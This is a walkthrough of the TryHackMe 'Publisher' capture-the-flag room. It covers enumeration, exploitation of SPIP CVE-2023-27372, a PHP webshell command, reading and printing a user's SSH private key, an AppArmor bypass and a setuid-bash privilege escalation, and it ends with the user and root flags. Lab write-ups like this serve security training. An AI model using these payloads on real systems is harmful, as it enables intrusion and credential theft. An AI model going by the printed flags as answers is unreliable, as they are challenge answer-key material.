# <div align="center">[Publisher](https://tryhackme.com/r/room/publisher)</div>
<div align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377893997" height="300"></img>
</div>

###### The “Publisher” CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system’s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.

* ##  Enumeration
### Let Make a Nmap Scan
```
death@esther:~$ nmap 10.10.102.137 -sV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 18:58 IST
Nmap scan report for 10.10.102.137
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.16 seconds
```
### According to scan 2 ports are open.
* ### SSH on port 22.
* ### HTTP on port 80.

### As HTTP is open let take a look.

<div align="center">
<img src="https://github.com/user-attachments/assets/d57d3ac9-fc20-45f4-b088-06e3febe28e7" height=""></img>
</div>

### I didn't Find anything, Let enumerate directories.

```
dirsearch -u <Ip> -w <wordlist>
```
```
death@esther:~$ dirsearch -u 10.10.102.137 -w ~/wordlists/directory-list-2.3-medium.txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 220544

Output File: /home/death/reports/_10.10.102.137/_24-09-09_19-00-50.txt

Target: http://10.10.102.137/

[19:00:51] Starting: 
[19:00:53] 301 -  315B  - /images  ->  http://10.10.102.137/images/
[19:01:53] 301 -  313B  - /spip  ->  http://10.10.102.137/spip/
[19:12:30] 403 -  278B  - /server-status

Task Completed
```
### Let navigate to Spip

<div align="center">
<img src="https://github.com/user-attachments/assets/4594f119-0380-425d-8ee3-b2b6857e5078" height=""></img>
</div>

### Let enumerate /spip/ directory,

```
death@esther:~$ dirsearch -u 10.10.102.137/spip/ 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/_10.10.102.137/_spip__24-09-09_19-39-28.txt

Target: http://10.10.102.137/

[19:39:28] Starting: spip/
[19:39:35] 403 -  278B  - /spip/.ht_wsr.txt
[19:39:35] 403 -  278B  - /spip/.htaccess.orig
[19:39:35] 403 -  278B  - /spip/.htaccess.bak1
[19:39:35] 403 -  278B  - /spip/.htaccess.sample
[19:39:35] 403 -  278B  - /spip/.htaccess.save
[19:39:35] 403 -  278B  - /spip/.htaccess_extra
[19:39:35] 403 -  278B  - /spip/.htaccess_orig
[19:39:35] 403 -  278B  - /spip/.htaccess_sc
[19:39:35] 403 -  278B  - /spip/.htaccessBAK
[19:39:35] 403 -  278B  - /spip/.htaccessOLD
[19:39:36] 403 -  278B  - /spip/.htaccessOLD2
[19:39:36] 403 -  278B  - /spip/.htm
[19:39:36] 403 -  278B  - /spip/.html
[19:39:36] 403 -  278B  - /spip/.htpasswds
[19:39:36] 403 -  278B  - /spip/.htpasswd_test
[19:39:36] 403 -  278B  - /spip/.httr-oauth
[19:39:38] 403 -  278B  - /spip/.php
[19:40:04] 200 -    7KB - /spip/CHANGELOG.md
[19:40:05] 200 -    2KB - /spip/composer.json
[19:40:06] 301 -  320B  - /spip/config  ->  http://10.10.102.137/spip/config/
[19:40:06] 200 -   27KB - /spip/composer.lock
[19:40:06] 200 -  570B  - /spip/config/
[19:40:18] 200 -    2KB - /spip/htaccess.txt
[19:40:20] 200 -    3KB - /spip/index.php
[19:40:20] 200 -    3KB - /spip/index.php/login/
[19:40:24] 200 -   34KB - /spip/LICENSE
[19:40:24] 301 -  319B  - /spip/local  ->  http://10.10.102.137/spip/local/
[19:40:24] 200 -  609B  - /spip/local/
[19:40:40] 200 -  842B  - /spip/README.md
[19:40:51] 301 -  317B  - /spip/tmp  ->  http://10.10.102.137/spip/tmp/
[19:40:51] 200 -  712B  - /spip/tmp/
[19:40:51] 200 -  527B  - /spip/tmp/sessions/
[19:40:54] 200 -    0B  - /spip/vendor/autoload.php
[19:40:54] 200 -  535B  - /spip/vendor/
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_namespaces.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/ClassLoader.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_files.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_real.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_classmap.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_psr4.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_static.php
[19:40:54] 200 -    1KB - /spip/vendor/composer/LICENSE
[19:40:54] 200 -   15KB - /spip/vendor/composer/installed.json

Task Completed
```
### Let take a view at local directory,

<div align="center">
<img src="https://github.com/user-attachments/assets/150dde31-a165-41df-bc6d-2be259f14e9c" height=""></img>
</div>

### Let View this config file.

<div align="center">
<img src="https://github.com/user-attachments/assets/dd67373e-b2f5-41da-8821-d82aafb4a172" height=""></img>
</div>

### The version is mentioned here let search for any CVE or Exploit.

<div align="center">
<img src="https://github.com/user-attachments/assets/87de6806-b78d-4562-bc0a-cc9024cdda94" height=""></img>
</div>

### As i thought there is ```CVE-2023-27372``` is present, here is the link of exploit [CVE-2023-27372](https://github.com/nuts7/CVE-2023-27372)

```
git clone https://github.com/nuts7/CVE-2023-27372
```
```
cd CVE-2023-27372/
```
```
pip install -r requirements.txt
```

### Oh my machine got expired. the ip was changed
### Now Let take a try might be it will work. Let try to print hii and save it into a txt file.
```
python3 CVE-2023-27372.py -u http://10.10.191.151/spip -c 'echo "hii" > hii.txt'  -v
```

<div align="center">
<img src="https://github.com/user-attachments/assets/1cfb1ad9-a181-4f08-be0e-431c56ab2e4c" height=""></img>
</div>

### Let check it.

<div align="center">
<img src="https://github.com/user-attachments/assets/c7cbbe45-9efe-4ab3-b97c-8302ea808537" height=""></img>
</div>

### Let upload a webshell,
```
python3 CVE-2023-27372.py -u http://10.10.191.151/spip -c 'echo "<?php system(\$_GET[\"cmd\"]); ?>" > webshell.php'  -v
```

<div align="center">
<img src="https://github.com/user-attachments/assets/c266727c-fd85-444c-b0a0-3ea578fb479e" height=""></img>
</div>

### Let access it.

<div align="center">
<img src="https://github.com/user-attachments/assets/09b371cc-b7e1-4699-9907-c05738f8be3c" height=""></img>
</div>

### Let execute some commands

```
?cmd=ls -at /home
```
<div align="center">
<img src="https://github.com/user-attachments/assets/b4ce3867-2aa7-4a49-bc59-d5e80af8b0f8" height=""></img>
</div>

### There is only 1 user think , Let try to access his directories.

<div align="center">
<img src="https://github.com/user-attachments/assets/795776af-0ff7-4333-8d77-fc0a804f916d" height=""></img>
</div>

### There is .ssh present let try can we get the pub key.


<div align="center">
<img src="https://github.com/user-attachments/assets/b41d4af2-e526-4052-99e0-fe77230226f2" height=""></img>
</div>

### Here is the key, Let read it,
```
?cmd=cat /home/think/.ssh/id_rsa
```
<div align="center">
<img src="https://github.com/user-attachments/assets/39055819-2957-49bf-a91a-50db90320508" height=""></img>
</div>

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
### Save this to file
```
nano rsa
```
```
chmod 600 rsa
```
### Let try to Login
```
ssh think@10.10.191.151 -i rsa
```
<div align="center">
<img src="https://github.com/user-attachments/assets/06252984-3e5f-42ed-b728-78c37c7a81f4" height=""></img>
</div>

## User flag
```
cat user.txt
```
```
fa229046d44eda6a3598c73ad96f4ca5  
```

## Escalate privilege 

### Let 1st look for a suid file
```
find / -perm -u=s -type f 2>/dev/null
```
```
think@publisher:~$ find / -perm -u=s -type f 2>/dev/null

/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
think@publisher:~$
```
### I just found an unknown file "run_container"

### I search on gtfobin i didnt find anything let try to execute it,
```
/usr/sbin/run_container
```
<div align="center">
<img src="https://github.com/user-attachments/assets/9e28f8c9-8bd2-460f-bf4a-398ce07f7b37" height=""></img>
</div>

### It asking to create or give id
* ### Let try a blank entry

<div align="center">
<img src="https://github.com/user-attachments/assets/01f48f8f-49a1-4626-9613-e543fb54ba55" height=""></img>
</div>

* ### Here is script in opt directory we cant access opt but we can read the contant of file.
<div align="center">
<img src="https://github.com/user-attachments/assets/7570a085-40a4-4f8c-80e0-d2d609dca2b3" height=""></img>
</div>

### As i just casuslly look at the shell i found this:

<div align="center">
<img src="https://github.com/user-attachments/assets/1010631e-e5f3-4ffb-bf9f-eac65debbc80" height=""></img>
</div>

### Let taka a look at App Armor  so we can find profile of this shell.

<div align="center">
<img src="https://github.com/user-attachments/assets/1010631e-e5f3-4ffb-bf9f-eac65debbc80" height=""></img>
</div>

### Hmm here is the running shell and good one is bash is running as root shell, Let switch the shell to manipulate root.
### Let go to dev/shm 
```
cd /dev/shm
```
### Copy shell here
```
cp /bin/bash .
```
### Run this
```
./bash -p
```
### Now we have access to opt directory
```
think@publisher:/dev/shm$ ls /opt
containerd  dockerfile  run_container.sh
```
### Open in any txt editor
```
nano /opt/run_container.sh
```
### Erase the whole code holding ```Ctrl``` + ```K```
### Add this:
```
#!/bin/bash

cp /bin/bash /tmp/test
chmod +s /tmp/test
```
### Save the file.
### Run this file.
```
run_container.sh
```
### Let run the file we created so we get root.
```
cd /tmp
```
```
./test -p
```
<div align="center">
<img src="https://github.com/user-attachments/assets/386548a0-39ae-4c1e-8808-17e16cdcf1ac" height=""></img>
</div>

## Root Flag

```
cat /root/root.txt
```
```
3a4225cc9e85709adda6ef55d6a4f2ca
```
